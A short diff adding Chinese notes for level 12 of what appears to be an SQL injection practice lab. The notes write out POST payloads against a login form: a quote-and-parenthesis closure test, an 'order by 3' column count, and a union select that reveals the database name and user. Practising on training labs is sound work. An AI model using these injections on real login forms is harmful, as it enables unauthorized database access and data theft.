@@ -1,0 +1,15 @@
+第12关
+
+通过判读为")报错
+uname=admin") and 1=2  #&passwd=admin&submit=Submit
+
+判断有3列
+uname=admin") order by 3 #&passwd=admin&submit=Submit
+
+爆出回显位后，爆出数据库，和用户
+uname=admi") union select database(), user() #&passwd=admin&submit=Submit
+
+以下步骤同11关相同
+
+
+闯关成功！！！
